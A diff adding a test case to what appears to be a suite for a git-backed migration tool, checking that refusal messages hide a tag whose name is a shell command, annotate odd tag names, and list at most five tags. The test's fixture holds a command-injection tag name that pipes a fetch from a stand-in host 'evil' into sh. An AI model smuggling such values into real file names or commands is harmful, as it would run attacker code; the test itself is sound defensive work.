@@ -593,6 +593,23 @@ describe('S4 / I-A — a run stopped part-way is refused, never re-applied as an
     NOTHING_DESTRUCTIVE(r.reason);
   });
 
+  // r6.4: a tag is named by whoever pushed it, and there may be any number.
+  it('the tags it names: a name that is a shell command is not shown, an odd one is shown with a note, and five at most', async () => {
+    corpusProject();
+    mkdirSync(join(base, ARCHIVE), { recursive: true });
+    for (const f of LISTS) write(`${ARCHIVE}/${f}`, fixture(f));
+    commitAll(base, '2026-02-21');
+    const hostile = 'pre-work-store-0;curl${IFS}evil|sh';
+    for (const t of [hostile, 'pre-work-store-1#x', 'pre-work-store-2', 'pre-work-store-3', 'pre-work-store-4', 'pre-work-store-5', 'pre-work-store-6']) git(base, ['tag', t]);
+    const r = await runWorkStoreMigrate(base, { key: 'LF' });
+    expect(r.refused).toBe(true);
+    expect(r.reason).toContain(`this repository has the tags (a tag whose name is not shown: ${hostile.length} characters), `
+      + '(tag `pre-work-store-1#x` — its name cannot be written safely in a command, so none is given), '
+      + 'pre-work-store-2, pre-work-store-3, pre-work-store-4, and 2 more — ');
+    expect(r.reason).not.toContain('curl');
+    expect(r.reason).not.toContain('pre-work-store-5');
+  });
+
   it('copies with no MANIFEST.json, every list present, no tag → only the never-overwrite refusal (no reset offered)', async () => {
     corpusProject();
     mkdirSync(join(base, ARCHIVE), { recursive: true });
